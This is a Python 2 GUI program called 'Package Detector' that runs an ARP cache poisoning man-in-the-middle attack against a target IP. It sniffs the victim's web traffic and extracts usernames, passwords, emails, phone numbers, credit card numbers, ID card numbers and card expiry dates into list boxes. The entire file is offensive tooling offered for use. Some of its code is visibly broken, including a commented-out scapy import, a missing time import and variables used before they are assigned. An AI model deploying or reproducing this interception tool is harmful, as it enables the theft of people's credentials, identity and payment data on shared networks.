from Tkinter import *
# from scapy.all import*
import socket
from socket import socket, AF_INET, SOCK_DGRAM
import string
import os
import sys
import threading
import subprocess
import urllib
from time import sleep
from subprocess import PIPE
from datetime import datetime
import re

# START arpspoof


def arpSpoof():
    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print "ARP Cache Poisoning"
    interface = "eth0"
    target_ip = Entry_Target.get()  # raw_input("input the target's ip: ")
    gateway_ip = "10.0.2.1"  # raw_input("input the gateway's ip: ")
    print("Start ARP Cache\nPoisoning")
    Status_Bar['text'] = "Start ARP Cache Poisoning"
    finish = "ARP poison\nattack finished"
    global poisoning
    poisoning = True

    def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

        # slightly different method using send
        print "[*] Restoring target..."
        Status_Bar['text'] = "[*] Restoring target..."
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    def get_mac(ip_address):

        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                                    ARP(pdst=ip_address), timeout=2, retry=10)

        # return the MAC address from a response
        for s, r in responses:
            return r[Ether].src

        return None

    def packet_callback(packets):
        web_packets = str(packets)
        test = 'username'
        testp = 'password'
        teste = 'email'
        testc = 'phone'
        testv = 'card'
        s = "&"
        usrn = ""
        pswd = ""
        email = ""
        phone = ""
        card = ""
        bole = 0
        co = 1
        web_packets.lower()
        web_packets = web_packets + s
        re = 0

        if "username" in web_packets:
            a = web_packets.find(test)
            b = web_packets.find(testp)
            if web_packets[a - 1] == "&" and web_packets[a] == "u":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        usrn = usrn + web_packets[a]
            if usrn != '':
                re = 1
                Regular_test = Regular_Expression(re, usrn)
                print 'Account:%s' % Regular_test
                usrn = ''
                bole = 0

            if web_packets[b - 1] == "&" and web_packets[b] == "p":
                while web_packets[b] != "&":
                    b = b + 1
                    if web_packets[b - 1] == "=":
                        bole = 1
                    if bole == 1:
                        if (co % 2) == 0:
                            pswd = pswd + '*'
                        else:
                            pswd = pswd + web_packets[b - 1]
                        co = co + 1

            if pswd != '':
                re = 2
                Regular_test = Regular_Expression(re, pswd)
                print "sever:%s" % packets[IP].dst
                print "Password:%s" % Regular_test
                pswd = ''
                bole = 0
                co = 1

        if 'email' in web_packets:
            a = web_packets.find(teste)
            if web_packets[a - 1] == "&" and web_packets[a] == "e":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        email = email + web_packets[a]
        if email != '':
            re = 3
            Regular_test = Regular_Expression(re, email)
            print 'Email:%s' % Regular_test
            email = ''
            bole = 0

        if 'phone' in web_packets:
            a = web_packets.find(testc)
            if web_packets[a - 1] == "&" and web_packets[a] == "p":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        phone = phone + web_packets[a]
        if phone != '':
            re = 4
            Regular_test = Regular_Expression(re, phone)
            print 'Phone:%s' % Regular_test
            phone = ''
            bole = 0

        if 'card' in web_packets:
            a = web_packets.find(testv)
            if web_packets[a - 1] == "&" and web_packets[a] == "c":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        card = card + web_packets[a]
        if card != '':
            re = 5
            Regular_test = Regular_Expression(re, card)
            print 'Card:%s' % Regular_test
            card = ''
            bole = 0

        if 'name' in web_packets:
            a = web_packets.find(testv)
            if web_packets[a - 1] == "&" and web_packets[a] == "i":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        name = name + web_packets[a]
        if name != '':
            re = 6
            Regular_test = Regular_Expression(re, name)
            print 'Name :%s' % Regular_test
            name = ''
            bole = 0

        if 'idcard' in web_packets:
            a = web_packets.find(testv)
            if web_packets[a - 1] == "&" and web_packets[a] == "i":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        idcard = idcard + web_packets[a]
        if idcard != '':
            re = 7
            Regular_test = Regular_Expression(re, card)
            print 'ID Card:%s' % Regular_test
            card = ''
            bole = 0

        if 'expire' in web_packets:
            a = web_packets.find(testv)
            if web_packets[a - 1] == "&" and web_packets[a] == "i":
                while web_packets[a] != "&":
                    a = a + 1
                    if web_packets[a - 1] == "=":
                        bole = 1
                    if bole == 1 and web_packets[a] != "&":
                        expire = expire + web_packets[a]
        if expire != '':
            re = 8
            Regular_test = Regular_Expression(re, expire)
            print 'Expire Date:%s' % Regular_test
            expire = ''
            bole = 0

    def Regular_Expression(r, s):
        if r == 1:
            Account_Pattern = re.compile(r'\w[\w\d_]{5,12}')
            Account_Matches = Account_Pattern.finditer(s)
            for Account in Account_Matches:
                List_Username.insert(0, Account.group(0))
                return Account.group(0)
        elif r == 2:
            Password_Pattern = re.compile(r'[\w\d_*]{5,12}')
            Password_Matches = Password_Pattern.finditer(s)
            for Password in Password_Matches:
                List_Password.insert(0, Password.group(0))
                return Password.group(0)
        elif r == 3:
            Email_Pattern = re.compile(r'[a-zA-Z0-9.-_]+@[a-zA-Z-_]+\.[a-z]+\.?[a-z]+\.?[a-z]+')
            Email_Matches = Email_Pattern.finditer(s)
            for Email in Email_Matches:
                List_Email.insert(0, Email.group(0))
                return Email.group(0)
        elif r == 4:
            Mobile_Pattern = re.compile(r'(\d{10})|(\d{4}\s\d{6})|(.\d{4}.\d{6})|(\d{4}-\d{6})')
            Mobile_Matches = Mobile_Pattern.finditer(s)
            for Mobile in Mobile_Matches:
                List_Mobile.insert(0, Mobile.group(0))
                return Mobile.group(0)
        elif r == 5:
            Credit_Pattern = re.compile(r'\d{4}.\d{4}.\d{4}.\d{4}')
            Credit_Matches = Credit_Pattern.finditer(s)
            for Credit in Credit_Matches:
                List_Credit.insert(0, Credit.group(0))
                return Credit.group(0)
        elif r == 6:
            Name_Pattern = re.compile(r'Name:\s[A-Za-z]+(\s[A-Za-z]+)?\n')
            Name_Matches = Name_Pattern.finditer(s)
            for Names in Name_Matches:
                List_Name.insert(0, Names.group(0))
                return Names.group(0)
        elif r == 7:
            IDCard_Pattern = re.compile(r'[A-Z]\d{9}')
            IDCard_Matches = IDCard_Pattern.finditer(s)
            for IDs in IDCard_Matches:
                List_IDcard.insert(0, IDs.group(0))
                return IDs.group(0)
        elif r == 8:
            Expire_Pattern = \
                re.compile(r'["\']?(\d{2}/\d{2})[\s"\']|(\d{2}/\d{2}/\d{4})')
            Expire_Matches = Expire_Pattern.finditer(s)
            for Dates in Expire_Matches:
                List_Expire.insert(0, Dates.group(0))
                return Dates.group(0)

    def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = gateway_ip
        poison_target.pdst = target_ip
        poison_target.hwdst = target_mac

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = target_ip
        poison_gateway.pdst = gateway_ip
        poison_gateway.hwdst = gateway_mac

        print "[*] Beginning the ARP poison. [PRESS Ctrl+C to stop]"
        Status_Bar['text'] = "[*] Beginning the ARP poison. [PRESS QUIT to quit]"

        while poisoning:
            send(poison_target)
            send(poison_gateway)

        print "[*] ARP poison attack finished."
        Status_Bar['text'] = "[*] ARP poison attack finished."
        print("%s" % finish)
        Status_Bar['text'] = "ARP poison attack finished"
        return

    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb = 0

    print "[*] Setting up %s" % interface
    Status_Bar['text'] = "[*] Setting up %s" % interface
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        Status_Bar['text'] = "[!!!] Failed to get gateway MAC. Exiting."
        while True:
            selbut()
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
        Status_Bar['text'] = "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        Status_Bar['text'] = "[!!!] Failed to get target MAC. Exiting."
        while True:
            arpSpoof()
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)
        Status_Bar['text'] = "[*] Target %s is at %s" % (target_ip, target_mac)

    # start poison thread
    poison_thread = threading.Thread(target=poison_target, args=(
        gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print "[*] Starting sniffer for packets"
        Status_Bar['text'] = "[*] Starting sniffer for packets"
        bpf_filter = "ip host %s" % target_ip
        packets = sniff(filter=bpf_filter, prn=packet_callback, store=0)

    except KeyboardInterrupt:
        pass

    finally:
        poisoning = False

        # wait for poisoning thread to exit
        time.sleep(2)

        # restore the network
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        sleep(1)

# END arpspoof
# Start of connection test


def connectivityTest(self):
    print 'Connectivity Test'
    Status_Bar['text'] = 'Connectivity Test'
    # Pings google.com
    thePing = subprocess.Popen('ping -c 5 google.com', shell=True, stdout=PIPE, stderr=PIPE)
    print("Testing\nConnectivity")
    Status_Bar['text'] = "Testing Connectivity"
    pingOut, pingErr = thePing.communicate()
    # If the ping fails ping 8.8.8.8
    if len(pingErr) > 0:
        thePing = subprocess.Popen('ping -c 5 8.8.8.8', shell=True, stdout=PIPE, stderr=PIPE)
        pingOut, pingErr = thePing.communicate()
        print 1
        # If pinging 8.8.8.8 fails display there is no internet connection
        if len(pingErr) > 0:
            print("No Internet\nConnection")
        # If pinging 8.8.8.8 succeeds, display there is no DHCP service available for the SlyPi to use.
        else:
            print("No DHCP\n Available")
    else:
        privateIP = getPrivateIP()
        publicIP = getPublicIP()
        print privateIP
        print publicIP


def errorCheck(error, failedMessage, succeedMessage):

    if 'brctl: not found' in error:
        print("Failed Install brctl")
        Status_Bar['text'] = "Failed Install brctl"
    elif len(error[1]) == 0:
        print(succeedMessage)
        Status_Bar['text'] = succeedMessage
        sleep(3)
    elif len(error[1]) > 0:
        print(failedMessage)
        Status_Bar['text'] = failedMessage
        sleep(2)
        os.execl('slypi.py', '')
    error = 0


def getPublicIP():
    publicIPUrl = urllib.urlopen("http://ip.nfriedly.com/")
    return publicIPUrl.read()


def getPrivateIP():
    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(('192.168.1.150', 0))
    privateIp = s.getsockname()
    return privateIp[0]


def run():
    th = threading.Thread(target=arpSpoof)
    th.setDaemon(True)
    th.start()

# End of connection test


root = Tk()
root.title("Package Detector")
root.geometry('1920x1080')
# START

set_padx = 2

Label_Target = Label(root, text="Target:", fg="black")
Label_Target.grid(row=0, column=0, sticky=E)

Entry_Target = Entry(root)
Entry_Target.grid(row=0, column=1, sticky=W)

Button_Test = Button(root, text="Connection Test", fg="black")
Button_Test.bind("<Button-1>", connectivityTest)
Button_Test.grid(row=0, column=2, sticky=W)

Button_Start = Button(root, text="Start ARP", fg="black", command=run)
Button_Start.grid(row=0, column=3, sticky=W)


Label_Username = Label(root, text="Username:", fg="black")
Label_Username.grid(row=1, column=0, padx=set_padx)
List_Username = Listbox(root)
List_Username.grid(row=2, column=0, padx=set_padx)

Label_Password = Label(root, text="Password:", fg="black")
Label_Password.grid(row=1, column=1, padx=set_padx)
List_Password = Listbox(root)
List_Password.grid(row=2, column=1, padx=set_padx)

Label_Email = Label(root, text="Email:", fg="black")
Label_Email.grid(row=1, column=2, padx=set_padx)
List_Email = Listbox(root)
List_Email.grid(row=2, column=2, padx=set_padx)

Label_Credit = Label(root, text="Credit", fg="black")
Label_Credit.grid(row=1, column=3, padx=set_padx)
List_Credit = Listbox(root)
List_Credit.grid(row=2, column=3, padx=set_padx)

Label_Name = Label(root, text="Name:", fg="black")
Label_Name.grid(row=3, column=0, padx=set_padx)
List_Name = Listbox(root)
List_Name.grid(row=4, column=0, padx=set_padx)

Label_IDcard = Label(root, text="ID Card:", fg="black")
Label_IDcard.grid(row=3, column=1, padx=set_padx)
List_IDcard = Listbox(root)
List_IDcard.grid(row=4, column=1, padx=set_padx)

Label_Mobile = Label(root, text="Moblie:", fg="black")
Label_Mobile.grid(row=3, column=2, padx=set_padx)
List_Mobile = Listbox(root)
List_Mobile.grid(row=4, column=2, padx=set_padx)

Label_Expire = Label(root, text="Expire:", fg="black")
Label_Expire.grid(row=3, column=3, padx=set_padx)
List_Expire = Listbox(root)
List_Expire.grid(row=4, column=3, padx=set_padx)

Button_Quit = Button(root, text="QUIT", fg="red")
Button_Quit.bind("<Button-1>", quit)
Button_Quit.grid(row=5, column=3, padx=20, sticky=N + S + E + W)

Status_Bar = Label(root, text="Perpareig...", relief=SUNKEN, anchor=W)
Status_Bar.grid(row=5, columnspan=3, padx=set_padx, sticky=N + S + E + W)
# END
root.mainloop()
# root.destroy()
